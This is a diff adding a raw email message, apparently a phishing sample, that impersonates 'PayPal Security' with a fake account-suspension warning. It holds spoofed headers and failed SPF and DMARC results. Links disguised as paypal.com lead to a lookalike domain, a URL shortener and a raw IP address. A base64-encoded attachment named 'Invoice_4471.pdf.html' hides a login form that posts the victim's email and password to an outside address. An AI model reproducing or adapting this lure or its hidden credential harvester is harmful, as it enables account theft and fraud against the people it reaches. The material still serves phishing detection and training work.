@@ -1,0 +1,63 @@
+Return-Path: <bounce-7731@mailer-dispatch.ru>
+Received: from mail.paypa1-support.com (unknown [203.0.113.45])
+	by mx.example.com (Postfix) with ESMTP id 4F2A1C0042
+	for <jdoe@example.com>; Mon, 21 Sep 2026 08:14:22 -0400 (EDT)
+Received: from [198.51.100.77] (helo=localhost)
+	by mail.paypa1-support.com with esmtp; Mon, 21 Sep 2026 12:14:19 +0000
+Authentication-Results: mx.example.com;
+	spf=fail (sender IP is 203.0.113.45) smtp.mailfrom=mailer-dispatch.ru;
+	dkim=none (message not signed);
+	dmarc=fail action=none header.from=paypa1-support.com
+From: "PayPal Security Team" <security@paypa1-support.com>
+Reply-To: paypal.verify.center@gmail.com
+To: jdoe@example.com
+Subject: URGENT: Your account has been suspended - Action Required
+Date: Mon, 21 Sep 2026 12:14:19 +0000
+Message-ID: <20260921121419.88213@localhost.localdomain>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="==OUTER=="
+
+--==OUTER==
+Content-Type: multipart/alternative; boundary="==ALT=="
+
+--==ALT==
+Content-Type: text/plain; charset="utf-8"
+
+Dear Customer,
+
+We detected unusual sign-in activity on your account. Your account has been
+suspended. Verify your identity within 24 hours to avoid suspension.
+
+Log in here: http://paypa1-secure.xyz/login.php?id=88213
+
+PayPal Security
+
+--==ALT==
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<p>Dear Customer,</p>
+<p>We detected <b>unusual sign-in</b> activity on your account. Your account has been
+suspended. Please verify your identity within 24 hours to avoid suspension.</p>
+<p><a href="http://paypa1-secure.xyz/login.php?id=88213">https://www.paypal.com/signin</a></p>
+<p><a href="https://bit.ly/3xYzAbC">Verify Now</a></p>
+<p>Update your billing details and password: <a href="http://198.51.100.23/secure/update">Update billing</a></p>
+<p>See the attached invoice for details.</p>
+<p>PayPal Security Team</p>
+</body></html>
+
+--==ALT==--
+
+--==OUTER==
+Content-Type: text/html; name="Invoice_4471.pdf.html"
+Content-Disposition: attachment; filename="Invoice_4471.pdf.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PGgyPlBheVBhbCAtIEludm9pY2UgVmlld2VyPC9oMj4KPGZvcm0gYWN0aW9u
+PSJodHRwOi8vMTk4LjUxLjEwMC4yMy9jb2xsZWN0LnBocCIgbWV0aG9kPSJQT1NUIj4KRW1haWw6
+IDxpbnB1dCBuYW1lPSJlbWFpbCI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQi
+IG5hbWU9InB3Ij48YnI+CjxidXR0b24+VmlldyBJbnZvaWNlPC9idXR0b24+PC9mb3JtPgo8c2Ny
+aXB0PmRvY3VtZW50LndyaXRlKGF0b2IoIlBIQStURzloWkdsdVp5NHVMand2Y0Q0PSIpKTwvc2Ny
+aXB0PjwvYm9keT48L2h0bWw+
+
+--==OUTER==--
